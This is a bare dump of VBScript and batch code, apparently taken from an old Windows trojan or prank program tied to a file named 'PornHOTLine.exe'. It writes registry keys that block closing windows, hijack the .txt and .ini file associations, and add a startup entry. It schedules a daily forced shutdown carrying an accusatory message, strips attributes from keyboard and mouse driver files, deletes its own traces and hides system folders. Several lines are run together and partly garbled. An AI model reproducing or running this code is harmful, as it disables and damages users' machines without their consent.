Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Extensions\.txt", "C:\WINDOWS\shut.bat ^.txt"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Extensions\.ini", "C:\WINDOWS\shut.bat ^.ini"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Control Panel\Desktop\MenuShowDelay", "750000"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Control Panel\Desktop\HungAppTimeout", "750000"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Control Panel\Desktop\WaitToKillAppTimeout", "750000"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Control Panel\Accessibility\MouseKeys\MaximumSpeed", "900"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Control Panel\Accessibility\MouseKeys\TimeToMaximumSpeed", "100"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKU\S-1-5-21-839522115-879983540-725345543-1004\Software\Microsoft\Windows\CurrentVersion\Explorer\Logon User Name", "COOL"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKU\S-1-5-21-839522115-879983540-725345543-1004\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKU\S-1-5-21-839522115-879983540-725345543-1004\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1"
c:\WINDOWS\system\chkdsk.bat
@echo off
AT /y /delete
AT 10:00 /every:1 /interactive "C:\WINDOWS\shut.bat"
@echo off
AT 10:00 /every:1 /interactive "C:\WINDOWS\shut.bat"
attrib -S -A -H -R %WINDIR%\system\keyboard.drv.attrib -S -A -H -R %WINDIR%\system\mouse.drv
attrib -S -A -H -R %WINDIR%\system32\drivers\kbdclass.sys
attrib -S -A -H -R %WINDIR%\system32\drivers\mouclass.sys
start /I /SEPARATE /REALTIME /B cool.vbs
start /I /SEPARATE /REALTIME /B cool.bat
TITLE cool
color 0c
cls.echo MsgBox "Wsdflsdzf" >> C:\WINDOWS\huh.vbs
echo shutdown -s -t 5 -c "Stop watching child porn" >> C:\WINDOWS\autoexe.bat
start /I /SEPARATE /REALTIME /B C:\WINDOWS\huh.vbs
start /I /SEPARATE /REALTIME /B C:\WINDOWS\autoexe.bat
del /f /q cool.vbs..del /f /q shut.bat..del /f /q C:\WINDOWS\huh.vbs
del /f /q C:\WINDOWS\autoexe.bat....del /f /q PornHOTLine.exe
del /f /q cool.bat..attrib +R +A +S +H C:\WINDOWS\shut.bat
attrib +R +A +S +H C:\DOCUME~1\ALLUSE~1\STARTM~1\PROGRA~1\STARTU~1\system.bat
attrib +R +H +S +A C:\autoexec.bat..attrib +R +H +S +A %WINDIR%